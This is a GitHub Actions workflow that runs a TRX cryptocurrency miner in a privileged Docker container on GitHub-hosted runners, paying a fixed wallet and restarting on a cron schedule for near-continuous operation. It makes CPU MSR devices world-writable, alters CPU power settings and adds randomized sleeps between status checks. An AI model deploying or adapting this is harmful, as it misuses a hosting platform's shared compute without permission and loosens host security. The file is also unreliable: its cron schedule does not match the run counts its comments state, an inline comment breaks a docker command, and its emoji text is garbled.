name: 24/7 Mining with MSR and Auto-Restart

on:
  workflow_dispatch:  # Manual trigger
  schedule:
    # Run every 4 hours 45 minutes for seamless 24/7 operation
    - cron: '0 */4,9,14,19 * * *'  # Run at hours 0,4,9,14,19 (5 times daily)

jobs:
  mining-operation:
    runs-on: ubuntu-22.04-16core
    timeout-minutes: 285  # 4 hours 45 minutes
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: Setup environment
      run: |
        echo "ğŸš€ Starting 24/7 Mining Operation"
        echo "================================="
        echo "Runner: Ubuntu 22.04 (16-core)"
        echo "Start Time: $(date)"
        echo "Duration: 4h 45m per session"
        echo "Auto-restart: Every 4h 45m via cron"
        echo "Wallet: TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9"
        echo "Worker: github1-$(date +%s)"
    
    - name: Install MSR module and dependencies
      run: |
        echo "ğŸ”§ Installing MSR module and dependencies..."
        
        # Update system
        sudo apt-get update -y
        
        # Install required packages for MSR
        sudo apt-get install -y \
          linux-headers-$(uname -r) \
          build-essential \
          dkms \
          msr-tools \
          cpuid \
          numactl
        
        # Load MSR module if available
        sudo modprobe msr 2>/dev/null || {
          echo "âš ï¸  MSR module not available in kernel, trying alternative..."
          # Try to build from source if needed
          git clone https://github.com/intel/msr-tools.git /tmp/msr-tools 2>/dev/null || true
        }
        
        # Check if MSR is accessible
        if sudo rdmsr 0x1A0 2>/dev/null; then
          echo "âœ… MSR module is working"
        else
          echo "âš ï¸  MSR access limited, continuing without..."
        fi
        
        # Enable MSR permissions
        sudo chmod 666 /dev/cpu/*/msr 2>/dev/null || true
        
        echo "ğŸ“¦ Dependencies installed"
    
    - name: Setup CPU optimization
      run: |
        echo "âš¡ Optimizing CPU settings..."
        
        # Disable CPU frequency scaling for mining
        sudo systemctl disable ondemand 2>/dev/null || true
        sudo systemctl stop ondemand 2>/dev/null || true
        
        # Set CPU governor to performance
        for governor in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
        do
          echo "performance" | sudo tee $governor 2>/dev/null || true
        done
        
        # Disable C-states for better performance
        echo "1" | sudo tee /sys/module/intel_idle/parameters/max_cstate 2>/dev/null || true
        
        # Increase watchdogs
        echo "30" | sudo tee /proc/sys/kernel/watchdog_thresh 2>/dev/null || true
        
        echo "âœ… CPU optimization completed"
    
    - name: Clean up previous containers
      run: |
        echo "ğŸ§¹ Cleaning up previous runs..."
        docker stop node 2>/dev/null || true
        docker rm node 2>/dev/null || true
        docker system prune -af 2>/dev/null || true
        echo "âœ… Cleanup done"
    
    - name: Start mining container with MSR support
      run: |
        echo "ğŸ³ Starting Docker container with MSR access..."
        
        # Create startup script with MSR support
        cat > /tmp/start_miner.sh << 'EOF'
        #!/bin/bash
        # Enable MSR access for container
        if [ -d /dev/cpu ]; then
          for i in /dev/cpu/*/msr; do
            [ -e "$i" ] && chmod 666 "$i" 2>/dev/null || true
          done
        fi
        
        # Start the miner
        exec /entrypoint.sh
        EOF
        
        chmod +x /tmp/start_miner.sh
        
        # Start container with MSR device access
        docker run --restart unless-stopped \
          --name node \
          --privileged \  # Needed for MSR access
          --cpus="9.6" \
          --memory="8g" \
          --cpu-shares="1024" \
          --ulimit nofile=65536:65536 \
          -v /dev/cpu:/dev/cpu:ro \
          -v /tmp/start_miner.sh:/custom-start.sh:ro \
          -d \
          -e POOL="rx.unmineable.com:3333" \
          -e COIN="TRX" \
          -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
          -e WORKER_NAME="github-16c-$(date +%H%M)" \
          -e CPU_LIMIT_ENABLE="true" \
          -e CPU_LIMIT_PERCENT="60" \
          -e THREADS="12" \
          -e MSR_ENABLED="true" \
          --entrypoint "/custom-start.sh" \
          thechristech/unmineable:latest
        
        echo "âœ… Container started with MSR support"
        
        # Wait for container to initialize
        sleep 10
        
        # Verify container is running
        if docker ps | grep -q node; then
          echo "ğŸ“Š Container Status: RUNNING"
          docker inspect node --format='{{.State.Status}} {{.State.StartedAt}}'
        else
          echo "âŒ Container failed to start"
          docker logs node --tail 20 2>/dev/null || true
          exit 1
        fi
    
    - name: Continuous monitoring and hello messages
      id: monitor
      run: |
        echo "ğŸ“¡ Starting monitoring system..."
        
        # Set end time (4 hours 40 minutes - leaving 5 min for cleanup)
        END_TIME=$((SECONDS + 280 * 60))
        ITERATION=0
        
        # Function to display mining stats
        show_mining_stats() {
          echo "â›ï¸  MINING STATS - $(date)"
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          
          # Container status
          if docker ps | grep -q node; then
            CONTAINER_ID=$(docker ps -q --filter name=node)
            echo "âœ… Container: Running (ID: ${CONTAINER_ID:0:12})"
            
            # Get container stats
            echo "ğŸ“Š Performance:"
            docker stats --no-stream node --format \
              "   CPU: {{.CPUPerc}} | MEM: {{.MemPerc}} | NET: {{.NetIO}}"
            
            # Show logs (last 3 lines)
            echo "ğŸ“ Recent Logs:"
            docker logs --tail 3 node 2>/dev/null | sed 's/^/   /'
          else
            echo "âŒ Container: NOT RUNNING"
            echo "âš ï¸  Attempting restart..."
            docker start node 2>/dev/null || {
              # Full restart if start fails
              docker rm -f node 2>/dev/null || true
              docker run --restart unless-stopped \
                --name node \
                --privileged \
                --cpus="9.6" \
                --memory="8g" \
                -d \
                -e POOL="rx.unmineable.com:3333" \
                -e COIN="TRX" \
                -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
                -e WORKER_NAME="github-restarted-$(date +%H%M)" \
                -e CPU_LIMIT_ENABLE="true" \
                -e CPU_LIMIT_PERCENT="60" \
                thechristech/unmineable:latest
            }
          fi
          
          # System info
          echo "ğŸ–¥ï¸  System Info:"
          echo "   Load: $(uptime | awk -F'load average:' '{print $2}')"
          echo "   Memory: $(free -m | awk 'NR==2{printf "%sMB/%sMB (%.1f%%)", $3,$2,$3*100/$2}')"
          echo "   Uptime: $(uptime -p)"
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        }
        
        # Main monitoring loop
        while [ $SECONDS -lt $END_TIME ]; do
          ITERATION=$((ITERATION + 1))
          
          # Show hello message
          echo "ğŸ”” $(date): hello - Mining iteration #$ITERATION"
          
          # Show detailed stats every 5th iteration
          if [ $((ITERATION % 5)) -eq 0 ]; then
            show_mining_stats
          else
            # Brief status
            if docker ps | grep -q node; then
              echo "âœ… Mining active"
            else
              echo "âš ï¸  Mining inactive - checking..."
            fi
          fi
          
          # Check time remaining
          TIME_LEFT=$((END_TIME - SECONDS))
          MINUTES_LEFT=$((TIME_LEFT / 60))
          echo "â° Time until auto-restart: ${MINUTES_LEFT}m ${TIME_LEFT}s"
          
          # Random sleep between 60-120 seconds
          SLEEP_TIME=$((RANDOM % 61 + 60))
          echo "ğŸ’¤ Sleeping for ${SLEEP_TIME}s..."
          echo ""
          
          sleep $SLEEP_TIME
          
          # Force container restart if it's been running too long (safety)
          if [ $((SECONDS % 3600)) -eq 0 ]; then  # Every hour
            echo "ğŸ”„ Hourly container health check..."
            if ! docker ps | grep -q node; then
              echo "âš ï¸  Container down, restarting..."
              docker start node 2>/dev/null || true
            fi
          fi
        done
        
        echo "ğŸ•’ Session completed, preparing for auto-restart..."
        echo "âœ… Total iterations: $ITERATION"
        echo "â³ Next run starts in 15 minutes via cron"
    
    - name: Prepare logs and cleanup for next run
      if: always()
      run: |
        echo "ğŸ“Š Session Summary - $(date)"
        echo "============================="
        
        # Save container logs
        echo "=== CONTAINER LOGS (LAST 100 LINES) ===" > /tmp/mining_logs.txt
        docker logs --tail 100 node 2>/dev/null >> /tmp/mining_logs.txt || echo "No logs available" >> /tmp/mining_logs.txt
        
        # Save system info
        echo "" >> /tmp/mining_logs.txt
        echo "=== SYSTEM INFO ===" >> /tmp/mining_logs.txt
        uptime >> /tmp/mining_logs.txt
        free -m >> /tmp/mining_logs.txt
        
        # Display logs
        cat /tmp/mining_logs.txt
        
        # Graceful shutdown
        echo "ğŸ›‘ Stopping container..."
        docker stop node 2>/dev/null || true
        
        # Remove container
        echo "ğŸ—‘ï¸  Removing container..."
        docker rm node 2>/dev/null || true
        
        # Clean Docker resources
        echo "ğŸ§¹ Cleaning Docker..."
        docker system prune -af 2>/dev/null || true
        
        # Reset CPU settings
        echo "âš™ï¸  Resetting CPU settings..."
        for governor in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
        do
          echo "powersave" | sudo tee $governor 2>/dev/null || true
        done
        
        echo "âœ… Cleanup completed at $(date)"
        echo ""
        echo "ğŸ”„ Next auto-restart scheduled via cron:"
        echo "   - Pattern: '0 */4,9,14,19 * * *'"
        echo "   - Runs at hours: 0, 4, 9, 14, 19"
        echo "   - Next run: In approximately 15 minutes"
        echo ""
        echo "ğŸ“ˆ 24/7 Coverage:"
        echo "   - Each run: 4h 45m"
        echo "   - Total per day: 5 runs Ã— 4h 45m = 23h 45m"
        echo "   - Gap between runs: 15 minutes"
    
    - name: Set up next restart
      run: |
        echo "ğŸ¯ Setting up for continuous operation..."
        
        # Calculate next run time
        CURRENT_HOUR=$(date +%H)
        NEXT_HOUR=$(( (CURRENT_HOUR + 4) % 24 ))
        
        echo "â° Current hour: ${CURRENT_HOUR}:00"
        echo "ğŸ”„ Next auto-restart at: ${NEXT_HOUR}:00"
        echo ""
        echo "ğŸ’¡ Tips for 24/7 operation:"
        echo "   1. Keep this workflow enabled"
        echo "   2. Monitor usage in GitHub Actions"
        echo "   3. Check wallet periodically: TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9"
        echo "   4. Worker name updates hourly for tracking"
